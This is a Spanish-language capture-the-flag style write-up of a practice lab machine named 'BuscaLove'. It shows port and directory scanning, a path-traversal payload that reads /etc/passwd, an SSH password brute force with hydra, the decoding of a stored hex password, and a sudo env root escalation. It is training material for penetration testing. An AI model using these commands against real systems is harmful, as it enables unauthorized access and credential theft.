---
layout: post
title: "BuscaLove"
date: 2024-12-3
categories: [pentesting]
image: /assets/images/imagen.jpg
---
iniciamos la maquina 

![[Pasted image 20241121181626.png]](/imagenes/Pasted%20image%2020241121181626.png)

analizamos los puertos con nmap  `nmap -p- --open -sCVS -vvv -Pn -n --min-rate 5000 172.18.0.2`

![[Pasted image 20241121181701.png]](/imagenes/Pasted%20image%2020241121181701.png)

buscamos directorios con gobuster `gobuster dir -u "172.18.0.2" -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt`

![[Pasted image 20241121181919.png]](/imagenes/Pasted%20image%2020241121181919.png)

entramos al link http://172.18.0.2/wordpress/ y vemos el codigo fuente 

![[Pasted image 20241121182104.png]](/imagenes/Pasted%20image%2020241121182104.png)

se verifica que se ueda usar LfI http://172.18.0.2/wordpress/index.php?love=../../../../../../../../../../etc/passwd

![[Pasted image 20241121182234.png]](/imagenes/Pasted%20image%2020241121182234.png)

encontramos dos usuarios pedro y rosa usamos hydra en cada uno para encontrar alguna contrasena la elegida es rosa
`hydra -l rosa -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2 -s 22`

![[Pasted image 20241121182352.png]](/imagenes/Pasted%20image%2020241121182352.png)

encontramos una contrasena para rosa y entramos mediante ssh 

![[Pasted image 20241121182446.png]](/imagenes/Pasted%20image%2020241121182446.png)

listamos los directorios

![[Pasted image 20241121182516.png]](/imagenes/Pasted%20image%2020241121182516.png)

listamos los directorios de root y encontramos un archivo secret.txt lo leemos y encontramos una cadena de carateres que analizamos usando chatgpt 

![[Pasted image 20241121182629.png]](/imagenes/Pasted%20image%2020241121182629.png)

con chatgpt descubrimos que esta en hex y posiblemente ascii o base 32 buscamos un decodificador online 

![[Pasted image 20241121182839.png]](/imagenes/Pasted%20image%2020241121182839.png)

 y tenemos una contrasena noacertarasosi
 probamos con el usurio pedro 

![[Pasted image 20241121182940.png]](/imagenes/Pasted%20image%2020241121182940.png)

listamos los directorios y vemos que tenemos acceso a la dirrecion /usr/bin/env  con gtfobins encontramos como escalar privilegios

![[Pasted image 20241121183102.png]](/imagenes/Pasted%20image%2020241121183102.png)

usamos el comando `sudo /usr/bin/env /bin/sh` y listo somos root


![[Pasted image 20241121183208.png]](/imagenes/Pasted%20image%2020241121183208.png)


